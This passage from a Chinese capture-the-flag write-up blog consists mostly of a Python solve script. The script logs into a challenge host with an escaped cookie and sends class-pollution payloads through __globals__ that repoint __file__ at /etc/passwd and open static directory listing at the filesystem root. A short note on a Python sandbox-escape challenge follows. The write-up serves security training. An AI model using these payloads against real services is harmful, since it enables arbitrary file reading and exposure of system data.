</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 设置目标URL</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://68fedf48-fdf7-4198-97d7-0b24f086966b.challenge.ctf.show/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 第一步：登录并获取 session</span>
</span></span><span class=line><span class=cl><span class=n>r1</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;login&#34;</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;user&#34;</span><span class=p>:</span> <span class=s1>&#39;&#34;adm</span><span class=se>\\</span><span class=s1>073n&#34;&#39;</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.05</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=s2>&#34;login success&#34;</span> <span class=ow>in</span> <span class=n>r1</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>set_cookie_header</span> <span class=o>=</span> <span class=n>r1</span><span class=o>.</span><span class=n>headers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;Set-Cookie&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>session_value</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>cookie</span> <span class=ow>in</span> <span class=n>set_cookie_header</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;session=&#39;</span> <span class=ow>in</span> <span class=n>cookie</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>session_value</span> <span class=o>=</span> <span class=n>cookie</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;=&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;;&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>  <span class=c1># 提取 session 值</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>session_value</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Session 值记录成功: </span><span class=si>{</span><span class=n>session_value</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;未找到 session 值，无法继续。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;登录失败，无法获取 session。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 第二步：构建污染 payload</span>
</span></span><span class=line><span class=cl><span class=n>data1</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;key&#34;</span><span class=p>:</span> <span class=s2>&#34;__class__</span><span class=se>\\\\</span><span class=s2>.__init__</span><span class=se>\\\\</span><span class=s2>.__globals__</span><span class=se>\\\\</span><span class=s2>.__file__&#34;</span><span class=p>,</span>  <span class=c1># 这将污染 Python 对象的 __file__ 属性</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;/etc/passwd&#34;</span>  <span class=c1># 设置为敏感文件路径</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Step 2: 原型链污染 (数据2)</span>
</span></span><span class=line><span class=cl><span class=n>data2</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;key&#34;</span><span class=p>:</span> <span class=s2>&#34;__class__</span><span class=se>\\\\</span><span class=s2>.__init__</span><span class=se>\\\\</span><span class=s2>.__globals__</span><span class=se>\\\\</span><span class=s2>.app.router.name_index.__mp_main__</span><span class=se>\\</span><span class=s2>.static.handler.keywords.directory_handler.directory_view&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Step 3: 修改路径处理 (数据3)</span>
</span></span><span class=line><span class=cl><span class=n>data3</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;key&#34;</span><span class=p>:</span> <span class=s2>&#34;__class__</span><span class=se>\\\\</span><span class=s2>.__init__</span><span class=se>\\\\</span><span class=s2>.__globals__</span><span class=se>\\\\</span><span class=s2>.app.router.name_index.__mp_main__</span><span class=se>\\</span><span class=s2>.static.handler.keywords.directory_handler.directory._parts&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;/&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Step 2: 发起原型链污染请求</span>
</span></span><span class=line><span class=cl><span class=n>r2</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;admin&#34;</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;session&#34;</span><span class=p>:</span> <span class=n>session_value</span><span class=p>},</span> <span class=n>json</span><span class=o>=</span><span class=n>data1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.05</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;第二步请求响应: </span><span class=si>{</span><span class=n>r2</span><span class=o>.</span><span class=n>text</span><span class=si>}</span><span class=s2> (状态码: </span><span class=si>{</span><span class=n>r2</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 检查第二步请求是否成功</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>r2</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=s2>&#34;success&#34;</span> <span class=ow>in</span> <span class=n>r2</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># 请求 static 目录以读取敏感数据</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.05</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r3</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;src&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;第三步请求响应: </span><span class=si>{</span><span class=n>r3</span><span class=o>.</span><span class=n>text</span><span class=si>}</span><span class=s2> (状态码: </span><span class=si>{</span><span class=n>r3</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;第二步请求失败，无法进行原型链污染。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Step 3: 发起数据2和数据3请求</span>
</span></span><span class=line><span class=cl><span class=n>r3</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;admin&#34;</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;session&#34;</span><span class=p>:</span> <span class=n>session_value</span><span class=p>},</span> <span class=n>json</span><span class=o>=</span><span class=n>data2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.05</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r4</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;admin&#34;</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;session&#34;</span><span class=p>:</span> <span class=n>session_value</span><span class=p>},</span> <span class=n>json</span><span class=o>=</span><span class=n>data3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.05</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r5</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;static/&#34;</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;session&#34;</span><span class=p>:</span> <span class=n>session_value</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.05</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;第五步请求响应: </span><span class=si>{</span><span class=n>r5</span><span class=o>.</span><span class=n>text</span><span class=si>}</span><span class=s2> (状态码: </span><span class=si>{</span><span class=n>r5</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 使用正则匹配 flag</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=s2>&#34;flag&#34;</span> <span class=ow>in</span> <span class=n>r5</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;\b[A-Za-z0-9]+_flag\b&#39;</span><span class=p>,</span> <span class=n>r5</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span> <span class=o>=</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Flag 被捕捉到: </span><span class=si>{</span><span class=n>flag</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;未找到 flag。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;没有发现 flag。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Step 4: 构建数据4并执行请求</span>
</span></span><span class=line><span class=cl><span class=n>data4</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;key&#34;</span><span class=p>:</span> <span class=s2>&#34;__class__</span><span class=se>\\\\</span><span class=s2>.__init__</span><span class=se>\\\\</span><span class=s2>.__globals__</span><span class=se>\\\\</span><span class=s2>.__file__&#34;</span><span class=p>,</span>  <span class=c1># 这将污染 Python 对象的 __file__ 属性</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;/&#34;</span> <span class=o>+</span> <span class=n>flag</span>  <span class=c1># 设置为敏感文件路径</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r6</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;admin&#34;</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;session&#34;</span><span class=p>:</span> <span class=n>session_value</span><span class=p>},</span> <span class=n>json</span><span class=o>=</span><span class=n>data4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.05</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r7</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;src&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;第七步请求响应: </span><span class=si>{</span><span class=n>r7</span><span class=o>.</span><span class=n>text</span><span class=si>}</span><span class=s2> (状态码: </span><span class=si>{</span><span class=n>r7</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=mossfern>mossfern</h2><p>一看题目描述，就很容易知道是python沙箱逃逸了</p><p><img src=/p/ciscn2024/QQ20250225-153353.jpg width=885 height=414 srcset="/p/ciscn2024/QQ20250225-153353_hu_150f8ea9fecc537.jpg 480w, /p/ciscn2024/QQ20250225-153353_hu_76c2d482ded13305.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=213 data-flex-basis=513px></p><p>创建文件把代码放到里面然后再来运行</p></section><footer class=article-footer><section class=article-tags><a href=/tags/ssrf/>Ssrf</a>
<a href=/tags/php/>Php</a>
<a href=/tags/jail/>Jail</a></section><section class=article-reward style="margin:var(--card-padding)0 0;display:block;text-transform:none;text-align:center"><h3 style="margin:0 0 .75rem;font-size:1.1rem">赞赏支持</h3><figure style="margin:0 auto"><img src=/wechat.png alt loading=lazy style="width:min(260px,90vw);height:auto;border:1px solid #eee;border-radius:12px;background:#fff;padding:6px;box-shadow:0 2px 8px rgba(0,0,0,4%)"><figcaption style=font-size:.9rem;color:#666;margin-top:.5rem></figcaption></figure></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/ctfshow-internal-competition/><div class=article-details><h2 class=article-title>ctfshow内部赛</h2></div></a></article><article><a href=/p/ctfshow-cms/><div class=article-details><h2 class=article-title>ctfshowCMS</h2></div></a></article><article><a href=/p/ctfshow-singles-cup-2/><div class=article-details><h2 class=article-title>ctfshow单身杯二</h2></div></a></article><article><a href=/p/ctfshow-watermelon-cup/><div class=article-details><h2 class=article-title>ctfshow西瓜杯</h2></div></a></article><article><a href=/p/ctfshow-spring-festival-fun-match/><div class=article-details><h2 class=article-title>ctfshow新春欢乐赛</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2024 -
2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>